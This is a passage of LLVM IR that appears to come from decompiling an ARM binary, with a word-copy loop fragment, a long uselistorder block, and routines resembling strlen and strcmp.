  %v0_1500c = load i32, i32* %r2.global-to-local, align 4
  %v2_1500c = add i32 %v0_1500c, -16
  store i32 %v2_1500c, i32* %r2.global-to-local, align 4
  %v6_15010 = icmp slt i32 %v0_1500c, 16
  br i1 %v6_15010, label %dec_label_pc_15014, label %dec_label_pc_14fe4.dec_label_pc_14fe4_crit_edge

dec_label_pc_14fe4.dec_label_pc_14fe4_crit_edge:  ; preds = %dec_label_pc_14fe4
  %v0_14fe4.pre = load i32, i32* @r3, align 4
  %v0_14fe8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14fe4

dec_label_pc_15014:                               ; preds = %dec_label_pc_14fe4
  %v2_15014 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15014, i32* @r4, align 4
  %v5_15014 = load i8*, i8** %stack_var_-8, align 4
  %v6_15014 = ptrtoint i8* %v5_15014 to i32
  store i32 %v6_15014, i32* @r5, align 4
  store i32 %v11_14fe0, i32* @lr, align 4
  %v2_15018 = add i32 %v0_1500c, -4
  store i32 %v2_15018, i32* %r2.global-to-local, align 4
  %v4_15018 = add i32 %v0_1500c, 2147483632
  %v5_15018 = and i32 %v2_15018, %v4_15018
  %v6_15018 = icmp slt i32 %v5_15018, 0
  store i1 %v6_15018, i1* %cpsr_v.global-to-local, align 1
  %v7_15018 = icmp slt i32 %v2_15018, 0
  store i1 %v7_15018, i1* %cpsr_n.global-to-local, align 1
  %v8_15018 = icmp eq i32 %v2_15018, 0
  store i1 %v8_15018, i1* %cpsr_z.global-to-local, align 1
  %v5_1501c = icmp slt i32 %v2_1500c, -12
  br i1 %v5_1501c, label %dec_label_pc_15038, label %dec_label_pc_15020

dec_label_pc_15020:                               ; preds = %dec_label_pc_15014, %dec_label_pc_14fd4, %dec_label_pc_15020
  %v1_1502c = phi i32 [ %v5_1502c, %dec_label_pc_15020 ], [ %v1_15008, %dec_label_pc_15014 ], [ %v0_14f3019, %dec_label_pc_14fd4 ]
  %v0_15020 = load i32, i32* @r3, align 4
  %v3_15020 = mul i32 %v0_15020, 16777216
  store i32 %v3_15020, i32* %ip.global-to-local, align 4
  %v0_15024 = load i32, i32* %r1.global-to-local, align 4
  %v1_15024 = add i32 %v0_15024, -4
  %v2_15024 = inttoptr i32 %v1_15024 to i32*
  %v3_15024 = load i32, i32* %v2_15024, align 4
  store i32 %v3_15024, i32* @r3, align 4
  store i32 %v1_15024, i32* %r1.global-to-local, align 4
  %v4_15028 = udiv i32 %v3_15024, 256
  %v5_15028 = or i32 %v4_15028, %v3_15020
  store i32 %v5_15028, i32* @ip, align 4
  %v2_1502c = add i32 %v1_1502c, -4
  %v3_1502c = inttoptr i32 %v2_1502c to i32*
  store i32 %v5_15028, i32* %v3_1502c, align 4
  %v4_1502c = load i32, i32* %r0.global-to-local, align 4
  %v5_1502c = add i32 %v4_1502c, -4
  store i32 %v5_1502c, i32* %r0.global-to-local, align 4
  %v0_15030 = load i32, i32* %r2.global-to-local, align 4
  %v2_15030 = add i32 %v0_15030, -4
  store i32 %v2_15030, i32* %r2.global-to-local, align 4
  %v6_15034 = icmp slt i32 %v0_15030, 4
  br i1 %v6_15034, label %dec_label_pc_15038.loopexit, label %dec_label_pc_15020

dec_label_pc_15038.loopexit:                      ; preds = %dec_label_pc_15020
  %v4_15030 = sub i32 3, %v0_15030
  %v5_15030 = and i32 %v4_15030, %v0_15030
  %v6_15030 = icmp slt i32 %v5_15030, 0
  %v7_15030 = icmp slt i32 %v2_15030, 0
  store i1 %v6_15030, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15030, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15038

dec_label_pc_15038:                               ; preds = %dec_label_pc_15038.loopexit, %dec_label_pc_15014
  %v2_14ea453 = phi i32 [ %v5_1502c, %dec_label_pc_15038.loopexit ], [ %v1_15008, %dec_label_pc_15014 ]
  %v0_14e9449 = phi i32 [ %v2_15030, %dec_label_pc_15038.loopexit ], [ %v2_15018, %dec_label_pc_15014 ]
  %v0_15038 = load i32, i32* %r1.global-to-local, align 4
  %v1_15038 = add i32 %v0_15038, 1
  store i32 %v1_15038, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1502c, { 0, 2, 1 }
  uselistorder i32 %v3_15020, { 1, 0 }
  uselistorder i32 %v2_15018, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15008, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14fe8, { 1, 0 }
  uselistorder i32 %v3_14fe4, { 1, 0 }
  uselistorder i32 %v0_14fe8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15008, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14fc0, { 0, 2, 1 }
  uselistorder i32 %v3_14fb4, { 1, 0 }
  uselistorder i32 %v2_14fac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14f9c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14f7c, { 1, 0 }
  uselistorder i32 %v3_14f78, { 1, 0 }
  uselistorder i32 %v0_14f7c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14f9c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14f54, { 0, 2, 1 }
  uselistorder i32 %v3_14f48, { 1, 0 }
  uselistorder i32 %v2_14f40, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14f30, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14f10, { 1, 0 }
  uselistorder i32 %v3_14f0c, { 1, 0 }
  uselistorder i32 %v0_14f10, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14f30, { 3, 2, 1, 0 }
  uselistorder i1 %v5_14fd8, { 2, 0, 1 }
  uselistorder i32 %v0_14ef0, { 1, 0 }
  uselistorder i32 %v0_14fdc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_14f3019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14ee0, { 2, 1, 0 }
  uselistorder i32 %v0_14ee0, { 2, 0, 1 }
  uselistorder i32 %v2_14ed8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14ed8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14ed8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_14f3020, { 2, 1, 0 }
  uselistorder i32 %v11_14eb4, { 1, 0 }
  uselistorder i32 %v7_14eb4, { 1, 0 }
  uselistorder i32 %v1_14e94, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14e94, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14e98, { 1, 0 }
  uselistorder i32 %v7_14e8c, { 0, 2, 1 }
  uselistorder i32 %v10_14e88, { 1, 0 }
  uselistorder i32 %v9_14e80, { 1, 0, 2 }
  uselistorder i32 %v6_14e7c, { 1, 0 }
  uselistorder i32 %v2_14e74, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_14e74, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14e84, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14e68, { 0, 2, 1 }
  uselistorder i32 %v13_14e64, { 1, 0 }
  uselistorder i32 %v4_14e60, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_14e60, { 2, 0, 1 }
  uselistorder i32 %v6_14e68, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14e58, { 0, 2, 1 }
  uselistorder i32 %v16_14e54, { 1, 0 }
  uselistorder i32 %v4_14e50, { 1, 2, 0 }
  uselistorder i32 %v0_14e60.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_14e58, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14e44, { 0, 3, 2, 1 }
  uselistorder i32 %v10_14e40, { 1, 0 }
  uselistorder i32 %v1_14e3c, { 1, 0 }
  uselistorder i32 %v10_14e38, { 1, 0 }
  uselistorder i32 %v0_14e38, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14e3c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_14e30, { 0, 2, 1 }
  uselistorder i32 %v2_14e24, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_14e24, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_14e3c37, { 1, 2, 0 }
  uselistorder i32 %v1_14e1c, { 2, 1, 0 }
  uselistorder i32 %v1_14e14, { 2, 3, 1, 0 }
  uselistorder i32 %v2_14e0c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_14e08, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_14e04, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_14e04, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_14df4, { 0, 2, 1 }
  uselistorder i32 %v4_14df0, { 1, 0 }
  uselistorder i32 %v3_14de4, { 1, 0 }
  uselistorder i32 %v1_14ddc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14dd0, { 1, 0 }
  uselistorder i32 %v12_14dcc, { 0, 2, 1 }
  uselistorder i32 %v8_14dac, { 1, 0, 2 }
  uselistorder i32 %v5_14dac, { 1, 0, 2 }
  uselistorder i32 %v2_14dac, { 1, 0, 2 }
  uselistorder i32 %v0_14dac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14dcc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_14d88, { 0, 2, 1 }
  uselistorder i32 %v4_14d84, { 1, 0 }
  uselistorder i32 %v3_14d78, { 1, 0 }
  uselistorder i32 %v1_14d70, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14d64, { 1, 0 }
  uselistorder i32 %v12_14d60, { 0, 2, 1 }
  uselistorder i32 %v8_14d40, { 1, 0, 2 }
  uselistorder i32 %v5_14d40, { 1, 0, 2 }
  uselistorder i32 %v2_14d40, { 1, 0, 2 }
  uselistorder i32 %v0_14d40, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14d60, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_14d1c, { 0, 2, 1 }
  uselistorder i32 %v4_14d18, { 1, 0 }
  uselistorder i32 %v3_14d0c, { 1, 0 }
  uselistorder i32 %v1_14d04, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14cf8, { 1, 0 }
  uselistorder i32 %v12_14cf4, { 0, 2, 1 }
  uselistorder i32 %v8_14cd4, { 1, 0, 2 }
  uselistorder i32 %v5_14cd4, { 1, 0, 2 }
  uselistorder i32 %v2_14cd4, { 1, 0, 2 }
  uselistorder i32 %v0_14cd4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14cf4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_14d30, { 0, 2, 1 }
  uselistorder i32 %v1_14d2c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_14cb0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_14cb0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14d34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_14dcc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_14ca4, { 1, 0 }
  uselistorder i32 %v0_14ca4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_14c9c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_14c9c, { 1, 0, 2 }
  uselistorder i32 %v0_14c9c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14dcc77, { 1, 0 }
  uselistorder i32 %v1_14c7c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_14c84, { 1, 0 }
  uselistorder i32 %v0_14c58, { 3, 0, 1, 2 }
  uselistorder i32 %v1_14c4c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_14c38, { 1, 0, 2 }
  uselistorder i32 %v1_14c34, { 1, 0 }
  uselistorder i32 %v1_14c2c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_14c2c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14c24, { 0, 2, 1 }
  uselistorder i32 %v3_14c24, { 3, 0, 1, 2 }
  uselistorder i1 %v0_14c24, { 1, 0 }
  uselistorder i1 %v1_14c24, { 1, 0 }
  uselistorder i32 %v3_14c20, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14c18, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14c04, { 1, 2, 0 }
  uselistorder i32 %v1_14bfc, { 0, 2, 1 }
  uselistorder i32 %v12_14bf8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14bec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14bf0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_14be0, { 0, 2, 1 }
  uselistorder i32 %v1_14bd8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14bd8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_14bd0, { 1, 0 }
  uselistorder i32 %v1_14bc8, { 2, 1, 0 }
  uselistorder i32 %v2_14bc0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_14bc0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_14bbc, { 1, 0 }
  uselistorder i32 %v2_14bb0, { 1, 0 }
  uselistorder i32 %v1_14bb0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_14bb0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 69, 1, 2, 3, 4, 5, 70, 6, 7, 8, 9, 10, 71, 11, 12, 67, 68, 72, 28, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 29, 30, 62, 31, 32, 33, 34, 35, 63, 36, 37, 38, 39, 40, 64, 41, 42, 43, 44, 45, 65, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 56, 2, 4, 6, 8, 5, 57, 7, 9, 11, 54, 10, 58, 53, 55, 59, 62, 60, 66, 67, 12, 13, 14, 16, 15, 17, 18, 61, 19, 20, 63, 21, 64, 22, 65, 23, 24, 25, 26, 27, 30, 28, 40, 29, 31, 34, 32, 41, 33, 35, 38, 36, 42, 37, 39, 43, 44, 47, 45, 48, 46, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 28, 1, 2, 29, 3, 4, 30, 5, 27, 33, 34, 6, 7, 19, 8, 10, 9, 11, 12, 31, 13, 14, 32, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 2, 23, 0, 24, 1, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 2, 25, 0, 26, 1, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -3, { 0, 1, 3, 2 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 15, { 12, 13, 14, 0, 22, 1, 23, 15, 16, 3, 17, 18, 4, 5, 6, 7, 8, 9, 10, 19, 11, 20, 2, 21 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 31, 2, 4, 5, 3, 6, 7, 8, 9, 18, 36, 41, 39, 40, 38, 32, 33, 22, 23, 34, 35, 37, 24, 25, 26, 27, 19, 28, 14, 15, 16, 10, 11, 12, 13, 17, 20, 21, 29, 30, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 11, { 8, 9, 10, 15, 21, 23, 2, 11, 12, 0, 13, 3, 14, 16, 17, 4, 18, 5, 19, 1, 20, 22, 6, 24, 25, 26, 7, 27 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 3, 5, 4, 23 }
  uselistorder i32 48, { 0, 2, 4, 15, 3, 5, 6, 17, 18, 11, 12, 13, 14, 24, 25, 26, 19, 27, 7, 16, 20, 1, 8, 21, 9, 22, 10, 23 }
  uselistorder i32 40, { 2, 11, 12, 3, 1, 5, 6, 13, 14, 15, 4, 16, 17, 0, 18, 20, 19, 8, 21, 9, 22, 7, 23, 10, 24 }
  uselistorder i32 36, { 4, 22, 6, 7, 8, 23, 9, 20, 10, 21, 11, 12, 13, 0, 1, 14, 2, 15, 3, 16, 17, 5, 24, 18, 25, 19, 26 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
  uselistorder i32 31, { 1, 2, 3, 0 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 24, { 0, 54, 55, 56, 57, 8, 9, 10, 12, 11, 13, 1, 14, 58, 59, 60, 15, 61, 16, 17, 62, 18, 53, 65, 66, 49, 50, 51, 52, 19, 20, 21, 22, 78, 79, 23, 82, 24, 2, 25, 67, 68, 26, 69, 46, 47, 27, 63, 64, 28, 29, 30, 70, 31, 32, 3, 33, 34, 35, 4, 36, 37, 38, 5, 71, 39, 72, 73, 74, 75, 40, 41, 6, 76, 42, 77, 43, 80, 44, 81, 7, 48, 45, 83 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32* @lr, { 160, 161, 162, 163, 164, 165, 166, 167, 168, 3, 4, 5, 6, 7, 8, 9, 10, 11, 2, 99, 100, 36, 169, 170, 12, 13, 101, 102, 103, 104, 105, 106, 93, 94, 95, 107, 120, 121, 108, 109, 110, 111, 112, 113, 114, 1, 115, 116, 118, 119, 117, 43, 44, 45, 46, 47, 48, 122, 123, 124, 125, 96, 126, 14, 25, 26, 27, 28, 29, 30, 31, 33, 32, 0, 34, 35, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 37, 38, 39, 40, 41, 42, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 127, 128, 129, 97, 98, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159 }
  uselistorder label %dec_label_pc_15020, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14fb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ee8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_14e74, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14e38, { 1, 0 }
  uselistorder label %dec_label_pc_14e24, { 1, 0 }
  uselistorder label %dec_label_pc_14de4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14cac, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_14c7c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_14c18, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_14bd8, { 1, 0 }
}

define i32 @function_15040(i32 %arg1) local_unnamed_addr {
dec_label_pc_15040:
  %v1_15040 = and i32 %arg1, -4
  %v1_15044 = inttoptr i32 %v1_15040 to i32*
  %v2_15044 = load i32, i32* %v1_15044, align 4
  %v1_15048 = urem i32 %arg1, 4
  store i32 %v1_15048, i32* @r3, align 4
  %v2_15048 = icmp eq i32 %v1_15048, 0
  %v1_1504c = sub nsw i32 0, %v1_15048
  br i1 %v2_15048, label %.preheader.preheader, label %dec_label_pc_15054

dec_label_pc_15054:                               ; preds = %dec_label_pc_15040
  %v1_15054 = or i32 %v2_15044, 255
  %v7_15058 = icmp eq i32 %v1_15048, 1
  br i1 %v7_15058, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_15054
  %v9_1505c = or i32 %v2_15044, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_15054, %bb
  %v8_15064 = phi i32 [ %v1_15054, %dec_label_pc_15054 ], [ %v9_1505c, %bb ]
  %v1_15060 = add nsw i32 %v1_15048, -2
  store i32 %v1_15060, i32* @r3, align 4
  %v7_15064 = icmp eq i32 %v1_15048, 3
  br i1 %v7_15064, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_15064 = or i32 %v8_15064, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_15040
  %v1_15074.ph = phi i32 [ %v2_15044, %dec_label_pc_15040 ], [ %v9_15064, %bb34 ], [ %v8_15064, %bb33 ]
  %v1_1506838 = urem i32 %v1_15074.ph, 256
  %v2_1506839 = icmp eq i32 %v1_1506838, 0
  %v2_1506c40 = and i32 %v1_15074.ph, 65280
  %v3_1506c41 = icmp eq i32 %v2_1506c40, 0
  %or.cond42 = or i1 %v2_1506839, %v3_1506c41
  %v2_1507043 = and i32 %v1_15074.ph, 16711680
  %v3_1507044 = icmp eq i32 %v2_1507043, 0
  %or.cond3145 = or i1 %v3_1507044, %or.cond42
  %v4_1507446 = icmp ult i32 %v1_15074.ph, 16777216
  %or.cond3247 = or i1 %v4_1507446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_15084, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_150781349 = phi i32 [ %v2_1507814, %.thread4 ], [ %v1_1504c, %.preheader.preheader ]
  %v1_1507c48.in = phi i32 [ %v1_1507c48, %.thread4 ], [ %v1_15040, %.preheader.preheader ]
  %v1_1507c48 = add i32 %v1_1507c48.in, 4
  %v2_1507814 = add i32 %v1_150781349, 4
  %v2_1507c = inttoptr i32 %v1_1507c48 to i32*
  %v3_1507c = load i32, i32* %v2_1507c, align 4
  %v1_15068 = urem i32 %v3_1507c, 256
  %v2_15068 = icmp eq i32 %v1_15068, 0
  %v2_1506c = and i32 %v3_1507c, 65280
  %v3_1506c = icmp eq i32 %v2_1506c, 0
  %or.cond = or i1 %v2_15068, %v3_1506c
  %v2_15070 = and i32 %v3_1507c, 16711680
  %v3_15070 = icmp eq i32 %v2_15070, 0
  %or.cond31 = or i1 %v3_15070, %or.cond
  %v4_15074 = icmp ult i32 %v3_1507c, 16777216
  %or.cond32 = or i1 %v4_15074, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_15084, label %.thread4

dec_label_pc_15084:                               ; preds = %.thread4, %.preheader.preheader
  %v1_1507813.lcssa = phi i32 [ %v1_1504c, %.preheader.preheader ], [ %v2_1507814, %.thread4 ]
  %v2_15068.lcssa = phi i1 [ %v2_1506839, %.preheader.preheader ], [ %v2_15068, %.thread4 ]
  %v3_1506c.lcssa = phi i1 [ %v3_1506c41, %.preheader.preheader ], [ %v3_1506c, %.thread4 ]
  %v3_15070.lcssa = phi i1 [ %v3_1507044, %.preheader.preheader ], [ %v3_15070, %.thread4 ]
  br i1 %v2_15068.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_15084
  %v2_15088 = add i32 %v1_1507813.lcssa, 1
  br i1 %v3_1506c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_1509017 = add i32 %v1_1507813.lcssa, 2
  br i1 %v3_15070.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_15098 = add i32 %v1_1507813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_15084, %bb35, %bb36, %bb37
  %v1_1509c = phi i32 [ %v2_15088, %bb35 ], [ %v2_1509017, %bb36 ], [ %v2_15098, %bb37 ], [ %v1_1507813.lcssa, %dec_label_pc_15084 ]
  ret i32 %v1_1509c

; uselistorder directives
  uselistorder i32 %v1_1507813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_1507c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15074.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15048, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 -2, { 1, 3, 4, 2, 12, 13, 14, 0, 5, 15, 23, 22, 24, 25, 26, 16, 17, 18, 19, 20, 21, 11, 10, 9, 8, 7, 6 }
  uselistorder i32 65535, { 2, 74, 75, 0, 1, 8, 9, 3, 17, 36, 18, 37, 38, 39, 19, 40, 41, 10, 42, 4, 23, 43, 22, 44, 20, 45, 21, 46, 47, 11, 48, 5, 49, 50, 27, 51, 26, 52, 24, 53, 25, 54, 13, 12, 55, 56, 28, 57, 29, 58, 59, 60, 14, 61, 62, 6, 30, 63, 31, 64, 32, 65, 66, 67, 15, 68, 69, 7, 35, 70, 33, 71, 34, 72, 16, 73 }
  uselistorder i32 -4, { 39, 18, 60, 61, 62, 6, 19, 20, 21, 63, 64, 65, 7, 22, 23, 24, 66, 67, 68, 8, 25, 26, 69, 17, 16, 70, 71, 72, 15, 14, 13, 12, 27, 28, 29, 30, 31, 5, 32, 3, 33, 4, 73, 11, 34, 47, 48, 49, 9, 50, 51, 52, 35, 46, 2, 36, 40, 41, 42, 43, 44, 45, 0, 1, 53, 54, 55, 56, 57, 58, 59, 37, 10, 38 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_150a0(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_150a4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_150a0

dec_label_pc_150a0:                               ; preds = %bb3, %bb
  %v0_150a4 = phi i32 [ %v0_150a4.pre, %bb ], [ %v5_150a4, %bb3 ]
  %v0_150a0 = phi i32 [ %tmp, %bb ], [ %v5_150a0, %bb3 ]
  %v1_150a0 = inttoptr i32 %v0_150a0 to i8*
  %v2_150a0 = load i8, i8* %v1_150a0, align 1
  %v1_150a4 = inttoptr i32 %v0_150a4 to i8*
  %v2_150a4 = load i8, i8* %v1_150a4, align 1
  %v3_150a4 = zext i8 %v2_150a4 to i32
  %v2_150a8 = icmp eq i8 %v2_150a0, 0
  br i1 %v2_150a8, label %.dec_label_pc_150b4_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_150a0
  %v5_150a4 = add i32 %v0_150a4, 1
  %v5_150a0 = add i32 %v0_150a0, 1
  %v3_150a0 = zext i8 %v2_150a0 to i32
  %v10_150ac = icmp eq i8 %v2_150a0, %v2_150a4
  br i1 %v10_150ac, label %dec_label_pc_150a0, label %dec_label_pc_150b4

.dec_label_pc_150b4_crit_edge:                    ; preds = %dec_label_pc_150a0
  br label %dec_label_pc_150b4

dec_label_pc_150b4:                               ; preds = %bb3, %.dec_label_pc_150b4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_150b4_crit_edge ], [ %v3_150a0, %bb3 ]
  %v2_150b4.pre-phi = sub nsw i32 %.pn, %v3_150a4
  ret i32 %v2_150b4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_150a0, { 0, 2, 1 }
  uselistorder i32 %v0_150a0, { 1, 0 }
  uselistorder i32 %v0_150a4, { 1, 0 }
